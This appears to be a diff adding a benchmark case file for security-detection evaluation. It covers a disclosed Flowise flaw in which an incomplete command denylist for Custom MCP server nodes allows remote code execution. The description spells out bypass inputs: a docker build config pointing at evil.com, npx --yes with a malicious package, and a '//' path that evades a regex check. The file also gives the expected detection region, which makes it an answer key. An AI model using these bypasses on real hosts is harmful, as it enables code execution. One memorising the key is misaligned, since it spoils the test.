@@ -1,0 +1,51 @@
+{
+  "schemaVersion": "1.0.0",
+  "id": "SB-TS-RW-068",
+  "track": "full",
+  "caseType": "real_world_disclosed",
+  "language": "typescript",
+  "canonicalKind": "command_injection",
+  "title": "Flowise Custom MCP server command blocklist incomplete, allowing docker build / npx --yes / node // path RCE",
+  "description": "In validateCommandFlags() (and the companion validateArgsForLocalFileAccess()) in packages/components/nodes/tools/MCP/core.ts, Flowise tries to restrict which command + argv a Custom MCP Server node may spawn using a per-command denylist (dangerousFlagsByCommand). The denylist is incomplete: for docker it blocks run/exec/-v/--privileged/etc. but not build/compose/--mount/--device/--entrypoint, so an attacker-supplied config {\"command\":\"docker\",\"args\":[\"build\",\"https://evil.com/\"]} passes validation and docker build <remote-url> fetches and executes a remote Dockerfile (RUN). For npx it blocks the short -y but not the long alias --yes, so {\"command\":\"npx\",\"args\":[\"--yes\",\"<malicious-pkg>\"]} auto-installs and runs an arbitrary package. Separately, validateArgsForLocalFileAccess uses the regex /^\\/[^/]/ which matches /etc/passwd but not //path, so a node argv beginning with // (e.g. //root/.flowise/storage/.../cmd.js) bypasses the absolute-path check and node loads/executes a local attacker-written file. Any user able to configure a Custom MCP node (any role, or an API with chatflow view+update) can thereby achieve remote code execution on the Flowise host when the command is later spawned for a prediction.",
+  "files": {
+    "root": "../../../../.repos/FlowiseAI_Flowise__34cf2854/"
+  },
+  "regions": [
+    {
+      "id": "R1",
+      "path": "packages/components/nodes/tools/MCP/core.ts",
+      "startLine": 282,
+      "endLine": 320,
+      "label": "vulnerable",
+      "capability": "code_execution",
+      "acceptedKinds": [
+        "command_injection"
+      ]
+    }
+  ],
+  "expectedOutcome": {
+    "mustDetectRegionIds": [
+      "R1"
+    ],
+    "mustNotFlagRegionIds": []
+  },
+  "realWorld": {
+    "repo": "FlowiseAI/Flowise",
+    "vulnerableCommit": "34cf28546b700998e88a8f14d6f6d0754f572da4",
+    "fixCommit": "7176dcb409b197ee1eeec0ebec389b6db36340f8",
+    "ghsa": "GHSA-m99r-2hxc-cp3q",
+    "cve": "",
+    "disclosure": {
+      "ghsaPublished": "2026-05-14",
+      "fixCommitDate": "2026-03-23"
+    }
+  },
+  "standards": {
+    "owaspAgenticTop10": {
+      "primary": "ASI05",
+      "secondary": [
+        "ASI02"
+      ]
+    }
+  }
+}
